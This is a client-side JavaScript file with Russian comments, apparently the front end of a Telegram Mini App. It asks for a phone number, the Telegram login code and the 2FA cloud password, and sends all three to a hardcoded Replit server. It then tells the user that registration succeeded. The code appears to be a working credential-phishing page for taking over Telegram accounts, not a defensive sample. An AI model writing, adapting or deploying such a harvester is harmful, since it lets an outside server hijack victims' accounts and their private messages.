// Настройки - ЗАМЕНИТЕ НА ВАШ РЕАЛЬНЫЙ АДРЕС СЕРВЕРА
const SERVER_URL = 'https://483aeb0e-d724-4e9b-ad96-9b813e0002fa-00-fe63autuudl3.pike.replit.dev/'; // Адрес вашего bot.js на Railway

// Элементы
const phoneInput = document.getElementById('phone');
const codeInput = document.getElementById('code');
const faInput = document.getElementById('fa');
const sendBtn = document.getElementById('sendCodeBtn');
const loginBtn = document.getElementById('loginBtn');
const messageDiv = document.getElementById('message');

let currentPhone = '';
let is2faRequested = false;

// Показать сообщение
function showMessage(text, type) {
    messageDiv.textContent = text;
    messageDiv.className = 'message ' + type;
    messageDiv.style.display = 'block';
}

// 1. Отправка кода
sendBtn.addEventListener('click', async () => {
    currentPhone = phoneInput.value.trim();
    
    if (!currentPhone || !currentPhone.startsWith('+')) {
        showMessage('Введите корректный номер телефона', 'error');
        return;
    }
    
    showMessage('📤 Отправка кода...', 'info');
    sendBtn.disabled = true;
    sendBtn.textContent = '⏳ Отправка...';
    
    try {
        const response = await fetch(SERVER_URL + '/send-code', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone: currentPhone })
        });
        
        const data = await response.json();
        
        if (data.success) {
            showMessage(`✅ Код отправлен! Проверьте Telegram`, 'success');
            codeInput.disabled = false;
            codeInput.focus();
            sendBtn.textContent = '✅ Код отправлен';
            sendBtn.style.background = '#666';
        }
    } catch (error) {
        showMessage('Ошибка соединения с сервером', 'error');
        sendBtn.disabled = false;
        sendBtn.textContent = '📤 Отправить код';
    }
});

// 2. Вход с кодом
loginBtn.addEventListener('click', async () => {
    const code = codeInput.value.trim();
    const fa = faInput.value.trim();
    
    if (!code) {
        showMessage('Введите код', 'error');
        return;
    }
    
    if (is2faRequested && !fa) {
        showMessage('Требуется 2FA пароль', 'error');
        return;
    }
    
    showMessage('🔐 Проверка кода...', 'info');
    loginBtn.disabled = true;
    loginBtn.textContent = '⏳ Проверка...';
    
    try {
        const response = await fetch(SERVER_URL + '/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                phone: currentPhone, 
                code: code,
                fa: fa || null
            })
        });
        
        const data = await response.json();
        
        if (data.success) {
            showMessage('✅ Регистрация успешна! Ожидайте подтверждения в Telegram.', 'success');
            loginBtn.textContent = '✅ Завершено';
            loginBtn.style.background = '#666';
            
            // Через 5 секунд закрываем или показываем финал
            setTimeout(() => {
                if (typeof window.Telegram !== 'undefined') {
                    window.Telegram.WebApp.close();
                }
            }, 5000);
        } else {
            showMessage('❌ Неверный код', 'error');
            loginBtn.disabled = false;
            loginBtn.textContent = 'Войти в систему';
        }
    } catch (error) {
        showMessage('Ошибка соединения', 'error');
        loginBtn.disabled = false;
        loginBtn.textContent = 'Войти в систему';
    }
});

// Активация кнопки входа при вводе кода
codeInput.addEventListener('input', () => {
    loginBtn.disabled = codeInput.value.length < 4;
});

// Имитация запроса 2FA (в реальности это будет приходить от бота)
function request2FAPassword() {
    is2faRequested = true;
    faInput.disabled = false;
    faInput.classList.add('fa-required');
    faInput.focus();
    showMessage('🔐 Требуется облачный пароль (2FA)', 'info');
}

// Для теста: имитируем запрос 2FA через 3 секунды после отправки кода
setTimeout(() => {
    // В реальности это будет вызываться при нажатии кнопки "2FA" в Telegram
    // request2FAPassword();
}, 3000);
